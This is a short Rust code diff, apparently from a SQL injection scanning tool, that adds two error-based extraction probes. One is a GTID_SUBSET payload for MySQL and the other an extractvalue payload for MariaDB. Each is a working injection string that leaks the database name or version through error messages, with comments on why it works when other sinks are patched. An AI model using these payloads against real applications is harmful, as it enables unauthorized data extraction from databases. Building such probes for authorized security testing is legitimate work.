@@ -93,6 +93,22 @@ fn extraction_probes() -> Vec<GeneratedPayload> {
             Some(MySQL),
             Some(SqlClause::Subquery),
         ),
+        // GTID_SUBSET(): MySQL >= 5.6 rejects a non-GTID first argument and
+        // echoes it verbatim — a clean leak when XPATH sinks are patched out.
+        probe(
+            "err-mysql-gtid-subset",
+            "' AND GTID_SUBSET(concat(0x7e,(SELECT database()),0x7e),1)-- -",
+            Some(MySQL),
+            Some(SqlClause::Subquery),
+        ),
+        // MariaDB shares the XPATH sinks but is fingerprinted separately, so it
+        // needs its own extraction vector to be attributed correctly.
+        probe(
+            "err-mariadb-extractvalue",
+            "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -",
+            Some(MariaDB),
+            Some(SqlClause::Subquery),
+        ),
         // --- PostgreSQL ------------------------------------------------------
         // CAST text->int: "invalid input syntax for integer: <value>".
         probe(
